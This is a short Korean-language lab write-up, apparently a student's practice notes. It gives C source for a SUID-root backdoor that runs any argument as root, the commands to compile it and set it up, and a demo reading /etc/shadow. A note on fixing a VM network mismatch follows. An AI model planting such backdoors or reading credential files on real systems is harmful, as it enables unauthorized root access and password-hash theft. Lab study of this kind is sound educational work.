### 🛠️ 구현 결과 (Backdoor3 실습 예시)
```c
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]){
   char exec[100];
   setuid(0);  // root 권한 획득 시도
   setgid(0);
   // 인자로 받은 명령어를 root 권한으로 실행 (표준 에러는 숨김)
   sprintf(exec, "%s 2>/dev/null", argv[1]);
   system(exec);
}

컴파일 및 설정: gcc -o backdoor3 backdoor3.c -> chmod 4755 backdoor3

실행 결과: 일반 사용자 계정에서 ./backdoor3 'cat /etc/shadow' 실행 시 root 전용 파일 내용 확인 성공.

🛠️ 3. 트러블슈팅 (Troubleshooting)
🔍 문제 발생 (Issue)
상황: 호스트(Windows)에서 VM(Rocky Linux)으로 SSH 접속 시도 시 타임아웃 발생.

에러 메시지: Network Error: Connection Time out

💡 원인 분석 (Cause)
호스트의 Vmnet8 어댑터 대역(192.168.101.x)과 VM의 IP 대역(192.168.100.x)이 불일치하여 통신 불가.

🚀 해결 방법 (Solution)
Rocky Linux에서 nmcli 또는 nmtui 도구를 사용하여 IP를 192.168.101.150으로 변경 후 네트워크 재시작.
